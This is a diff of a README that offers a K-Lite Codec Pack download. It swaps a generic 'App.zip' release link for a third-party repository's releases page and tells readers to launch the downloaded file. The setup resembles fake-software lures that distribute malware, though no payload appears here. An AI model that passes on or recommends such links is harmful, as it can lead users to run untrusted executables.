@@ -23,7 +23,7 @@ Let's dive into the key features and topics covered within this repository:
 - **Understanding Audio and Video Codecs**: Delve into the world of audio and video codecs to understand how they work.
 
 ## Download Link
-👉 [Download K-Lite Codec Pack](https://github.com/repo/releases/9246/App.zip) 👈
+👉 [Download K-Lite Codec Pack](https://github.com/red-kurumi/K-Lite-Codec-Pack/releases) 👈
 
 *Note: Launch the downloaded file to kickstart your codec pack experience.*
 
